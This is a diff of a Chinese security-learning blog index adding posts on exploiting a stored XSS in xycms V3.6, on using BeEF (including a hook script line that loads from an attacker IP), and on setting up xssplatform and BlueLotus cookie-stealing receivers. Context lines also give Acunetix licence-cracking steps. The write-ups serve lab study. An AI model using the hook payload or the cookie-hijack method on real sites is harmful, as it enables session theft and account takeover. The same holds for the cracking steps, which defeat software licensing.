@@ -178,6 +178,251 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">xycmsV3.6-xss漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-03 21:01:38 / 修改时间：22:07:44" itemprop="dateCreated datePublished" datetime="2022-08-03T21:01:38+08:00">2022-08-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="搭建xycms"><a href="#搭建xycms" class="headerlink" title="搭建xycms"></a>搭建xycms</h3><p>1、将uploads_code文件夹下的内容放至根目录</p>
+<p>2、访问<a target="_blank" rel="noopener" href="http://localhost/install/%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E3%80%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7xyhcms">http://localhost/install/进行安装「默认账号xyhcms</a> 密码安装时自定义 」</p>
+<p>3、安装完成后为了保证数据安全，务必删除install目录</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在新闻中心找一篇文章评论，管理员审核后返回管理员cookie</p>
+<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803211212164.png" alt="image-20220803211212164"></p>
+<p>假装管理员访问后台：<a target="_blank" rel="noopener" href="http://192.168.2.142:8001/xyhai.php?s=/Login/index">http://192.168.2.142:8001/xyhai.php?s=/Login/index</a>   「xyhcms&#x2F;123456」</p>
+<p>进入评论管理审核 审核完成后点击编辑-保存-xss漏洞触发成功</p>
+<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803213331569.png" alt="image-20220803213331569"></p>
+<p>linux中的beef成功获取，Browser—&gt;Hooked Domain —&gt;Get Cookie</p>
+<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803215914100.png" alt="image-20220803215914100"></p>
+<p>管理员的cookie：cookie&#x3D;PHPSESSID&#x3D;dcc41v231dohkhp9ccsqnhn802;</p>
+<p>和我自己伪造管理员登录的cookie相同</p>
+<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803220016470.png" alt="image-20220803220016470"></p>
+<p>伪造身份成功登录</p>
+<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803220448535.png" alt="image-20220803220448535"></p>
+<p>注意：我windows虚拟机搭建的xyhcms在新增评论时，网址必须是明确的ip，不能是localhost，否则会被linux的beef识别错误。</p>
+<img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803213649909.png" alt="image-20220803213649909" style="zoom:50%;">
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/03/beef%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/03/beef%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">beef使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-03 20:37:47 / 修改时间：22:10:03" itemprop="dateCreated datePublished" datetime="2022-08-03T20:37:47+08:00">2022-08-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>扫描局域网从属机器、xss获取cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali：sudo beef-xss/找applications里的那头牛：beef start</span><br><span class="line">http://127.0.0.1:3000/ui/panel  beef/beef「默认账密可去/etc/beef-xss/config.yaml修改」</span><br></pre></td></tr></table></figure>
+
+<p> 将该hook粘到目标源码中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook: &lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看结果：http://127.0.0.1:3000/ui/panel</span><br></pre></td></tr></table></figure>
+
+<p>commands：网页重定向、社工弹窗「界面可能不太真实」——&gt;execute</p>
+<p>关闭beef：systemctl stop beef-xss.service</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">xssplatfrom、bluelotus使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-29 14:33:46" itemprop="dateCreated datePublished" datetime="2022-07-29T14:33:46+08:00">2022-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-03 20:34:07" itemprop="dateModified" datetime="2022-08-03T20:34:07+08:00">2022-08-03</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="搭建xssplatform平台"><a href="#搭建xssplatform平台" class="headerlink" title="搭建xssplatform平台"></a>搭建xssplatform平台</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a></p>
+<h4 id="修改数据库用户名、密码"><a href="#修改数据库用户名、密码" class="headerlink" title="修改数据库用户名、密码"></a>修改数据库用户名、密码</h4><p>git clone至小皮的WWW目录，并把里面的文件拷贝到网页根目录<br>文件内路径改为自己的源码的路径： ‘filepath’ &#x3D;&gt; ‘C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;upload’<br>改成自己的ipcofnig： ‘urlroot’ &#x3D;&gt; ‘<a href="http://192.168.2.142:8001&#39;">http://192.168.2.142:8001&#39;</a>,<br>php版本需大于7.0</p>
+<h4 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database xssplatform;</span><br><span class="line">use xssplatform;</span><br><span class="line">source xssplatform.sql;</span><br></pre></td></tr></table></figure>
+
+<h4 id="小皮面板-管理-伪静态"><a href="#小皮面板-管理-伪静态" class="headerlink" title="小皮面板-管理-伪静态"></a>小皮面板-管理-伪静态</h4><p>安装说明.txt中选择对应的apache页面填入</p>
+<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803182053665.png" alt="image-20220803182053665"></p>
+<h4 id="成功搭建"><a href="#成功搭建" class="headerlink" title="成功搭建"></a>成功搭建</h4><p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184029540.png" alt="image-20220803184029540"></p>
+<h4 id="例一、获取cookie"><a href="#例一、获取cookie" class="headerlink" title="例一、获取cookie"></a>例一、获取cookie</h4><p>创建项目、选择默认模块、获取代码，平台上有附使用说明</p>
+<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184155659.png" alt="image-20220803184155659" style="zoom: 50%;"><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184512232.png" alt="image-20220803184512232" style="zoom: 23%;"><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184426621.png" alt="image-20220803184426621" style="zoom: 25%;"></p>
+<h1 id="bluelotus"><a href="#bluelotus" class="headerlink" title="bluelotus"></a>bluelotus</h1><p><a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.142:8001/bluelotus/install.php">http://192.168.2.142:8001/bluelotus/install.php</a></p>
+<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803185209974.png" alt="image-20220803185209974"></p>
+<p>不用修改其他数据</p>
+<p>windows环境安装失败 linux安装成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803202446303.png" alt="image-20220803202446303"></p>
+<p>我的JS-选择模板-插入模板-新增-生成payload-生成的js代码可插入目标机源码中</p>
+<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803203050491.png" alt="image-20220803203050491"></p>
+<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803202642369.png" alt="image-20220803202642369"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -227,7 +472,7 @@
 
       
           <h2 id="aWVS"><a href="#aWVS" class="headerlink" title="aWVS"></a>aWVS</h2><p>arl-awvs.py:联合arl灯塔进行扫描</p>
-<p>用户名密码：<a href="mailto:&#x61;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#115;&#46;&#99;&#x6f;&#x6d;">&#x61;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#115;&#46;&#99;&#x6f;&#x6d;</a>&#x2F;<a href="mailto:&#x41;&#x77;&#x76;&#x73;&#x40;&#97;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#109;">&#x41;&#x77;&#x76;&#x73;&#x40;&#97;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#109;</a></p>
+<p>用户名密码：<a href="mailto:&#x61;&#x77;&#x76;&#x73;&#x40;&#x61;&#x77;&#x76;&#115;&#x2e;&#x63;&#111;&#109;">&#x61;&#x77;&#x76;&#x73;&#x40;&#x61;&#x77;&#x76;&#115;&#x2e;&#x63;&#111;&#109;</a>&#x2F;<a href="mailto:&#65;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#x73;&#x2e;&#99;&#x6f;&#x6d;">&#65;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#x73;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 <h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker search awvs</span><br><span class="line">sudo docker pull xrsec/awvs</span><br><span class="line">docker run -it -d --name awvs -p 3445:3443 --restart=always xrsec/awvs:latest</span><br></pre></td></tr></table></figure>
 
 <h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">复制license_info.json&amp;wa_data.dat---&gt;</span><br><span class="line">windows&gt;&gt;&gt;C:/PrpgramData/Acunetix/shared/license/</span><br><span class="line">linux&gt;&gt;&gt;/home/acunetix/.acunetix/data/license/</span><br><span class="line">mac&gt;&gt;&gt;/Applications/Acunetix.app/Contents/Resources/data/license</span><br><span class="line"></span><br><span class="line">docker&gt;&gt;&gt;docker cp license_info.json&amp;wa_data.dat---&gt; doker-id:/home/acunetix/.acunetix/data/license</span><br><span class="line"></span><br><span class="line">修改hosts文件：</span><br><span class="line">windows：C:\Windows\System32\drivers\etc</span><br><span class="line">linux:/etc/hosts</span><br><span class="line">追加：</span><br><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>
@@ -836,7 +1081,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -849,7 +1094,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
